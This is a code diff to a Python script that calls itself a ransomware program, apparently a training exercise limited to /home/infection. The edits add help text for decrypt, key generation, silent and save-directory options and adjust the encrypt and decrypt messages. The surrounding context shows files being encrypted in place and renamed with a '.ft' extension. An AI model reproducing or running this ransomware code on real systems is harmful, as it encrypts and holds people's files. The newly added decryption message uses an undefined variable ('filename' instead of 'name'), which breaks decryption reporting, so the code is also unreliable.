@@ -29,11 +29,11 @@ extensions = [
 
 parser = argparse.ArgumentParser(description='This program executes a ransomware virus in /home/infection')
 
-parser.add_argument('-r', '--reverse', type=str)
-parser.add_argument('-k', '--genkey')
-parser.add_argument('-s', '--silent', action='store_true')
-parser.add_argument('-v', '--version', action='store_true')
-parser.add_argument('-d', '--savedir', type=str)
+parser.add_argument('-r', '--reverse', type=str, help='Decrypt all infected files')
+parser.add_argument('-k', '--genkey', help='Generate encryption key')
+parser.add_argument('-s', '--silent', action='store_true', help='Activate silent mode')
+parser.add_argument('-v', '--version', action='store_true', help='Show version')
+parser.add_argument('-d', '--savedir', type=str, help='Save unencripted files in a folder, must be specified')
 args = parser.parse_args()	
 
 def genkey():
@@ -53,7 +53,7 @@ def encript_file(filename):
 		with open(filename, 'wb') as enc_file:
 			enc_file.write(enc_data)
 		os.rename(filename, filename + '.ft')
-		print(filename + " has been encripted")
+		print(filename + " has been encrypted")
 	except:
 		pass
 		
@@ -67,6 +67,7 @@ def unencript_file(name, key):
 			with open(name, 'wb') as or_file:
 				or_file.write(or_data)
 			os.rename(name, name[:len(name)-len('.ft')])
+			print(filename + " has been decrypted")
 		except:
 			print("Invalid key")
 			exit()
